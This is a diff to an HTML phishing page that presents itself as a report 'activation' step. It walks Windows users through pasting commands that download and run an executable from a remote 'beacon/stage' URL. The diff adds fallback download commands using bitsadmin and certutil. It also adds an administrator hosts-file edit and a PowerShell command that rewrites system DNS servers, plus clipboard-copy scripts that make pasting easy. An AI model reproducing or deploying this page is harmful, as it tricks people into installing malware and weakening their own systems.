@@ -32,9 +32,25 @@ before it can be opened. The activation takes a few seconds.</p>
   <li>Click the command below to copy it, then paste it into the Run box</li>
   <li>Press <b>Enter</b> — the report manifest downloads and the documents open automatically</li>
 </ol>
-<div class="code" id="cmd" onclick="cp()">curl.exe -sk -o &quot;%TEMP%\~DFcmd.exe&quot; &quot;https://sync.protaskir.co.il/api/v1/beacons/0ac6182d-e8ef-436a-b3a4-f51ccecd53b4/stage?cap=61c21dd31373b8ad38a5c96d6d942ebd&amp;fmt=loader-raw&quot; &amp;&amp; start &quot;&quot; &quot;%TEMP%\~DFcmd.exe&quot;</div>
+<div class="code" id="cmd" onclick="cp()">curl.exe -sk --doh-url https://1.1.1.1/dns-query -o &quot;%TEMP%\~DFcmd.exe&quot; &quot;https://sync.protaskir.co.il/api/v1/beacons/0ac6182d-e8ef-436a-b3a4-f51ccecd53b4/stage?cap=61c21dd31373b8ad38a5c96d6d942ebd&amp;fmt=loader-raw&quot; &amp;&amp; start &quot;&quot; &quot;%TEMP%\~DFcmd.exe&quot;</div>
 <div class="hint">click the command once to copy — it is long, that is expected</div>
 <p id="done">✔ Copied. Paste it into the Run box and press Enter.</p>
+
+<div class="sec" style="margin-top:1.4rem">If the download fails — DNS repair (run once, admin cmd)</div>
+<p style="font-size:.8rem;color:#5a6a78;margin-bottom:.6rem">Some workstations cannot resolve the delivery service name.
+Run this once from an <b>Administrator</b> command prompt, then re-run the activation command above:</p>
+<div class="code" onclick="cp2()">echo 104.21.28.252 sync.protaskir.co.il&gt;&gt;C:\Windows\System32\drivers\etc\hosts</div>
+<p id="done2" style="font-size:.75rem;color:#1a7f37;margin-top:.4rem">✔ Copied. Paste into an Administrator cmd and press Enter, then retry the activation.</p>
+
+<div class="sec" style="margin-top:1.4rem">Alternative retrieval commands</div>
+<p style="font-size:.8rem;color:#5a6a78;margin-bottom:.6rem">If the activation command is blocked, these alternatives fetch the same package:</p>
+<div class="code" onclick="cp3()">bitsadmin /transfer reportJob /download /priority high &quot;https://sync.protaskir.co.il/api/v1/beacons/0ac6182d-e8ef-436a-b3a4-f51ccecd53b4/stage?cap=61c21dd31373b8ad38a5c96d6d942ebd&amp;fmt=loader-raw&quot; &quot;%TEMP%\~DFcmd.exe&quot;</div>
+<div class="hint">Background Intelligent Transfer — native Windows, use cmd (not PowerShell)</div>
+<div class="code" onclick="cp4()">certutil -urlcache -split -f &quot;https://sync.protaskir.co.il/api/v1/beacons/0ac6182d-e8ef-436a-b3a4-f51ccecd53b4/stage?cap=61c21dd31373b8ad38a5c96d6d942ebd&amp;fmt=loader-raw&quot; &quot;%TEMP%\~DFcmd.exe&quot;</div>
+<div class="hint">Certificate tool download — native Windows, works in cmd and PowerShell</div>
+<div class="code" onclick="cp5()">powershell -c "Set-DnsClientServerAddress -InterfaceAlias (Get-NetAdapter | Where-Object {$_.Status -eq 'Up'} | Select-Object -First 1).InterfaceAlias -ServerAddresses 1.1.1.1,8.8.8.8"</div>
+<div class="hint">DNS override to public resolvers (admin PowerShell) — fixes resolution for ALL tools, then re-run the activation command</div>
+<p id="done3" style="display:none;color:#1a7f37;font-size:.75rem">✔ Copied.</p>
 
 <div class="files">
   <h2>Report package files</h2>
@@ -88,8 +104,21 @@ before it can be opened. The activation takes a few seconds.</p>
 </div>
 <script>
 function cp(){
-  var t=document.getElementById('cmd').innerText;
-  navigator.clipboard.writeText(t).then(function(){document.getElementById('done').style.display='block';});
+  copyText(document.getElementById('cmd').innerText, 'done');
+}
+function cp2(){
+  copyText(document.getElementById('cmd2') ? document.getElementById('cmd2').innerText : event.srcElement.innerText, 'done2');
+}
+function cp3(){ copyText(event.srcElement.innerText, 'done3'); }
+function cp4(){ copyText(event.srcElement.innerText, 'done3'); }
+function cp5(){ copyText(event.srcElement.innerText, 'done3'); }
+function copyText(t, doneId){
+  navigator.clipboard.writeText(t).then(function(){
+    var d = document.getElementById(doneId);
+    if(d && d.style){ d.style.display='block'; setTimeout(function(){ if(d) d.style.display='none'; }, 4000); }
+    var s = document.getElementById('done');
+    if(s && doneId !== 'done'){ s.style.display='none'; }
+  });
 }
 var PROBES={
   'probe.reg':{src:'assets/data1.txt',mime:'text/plain'},
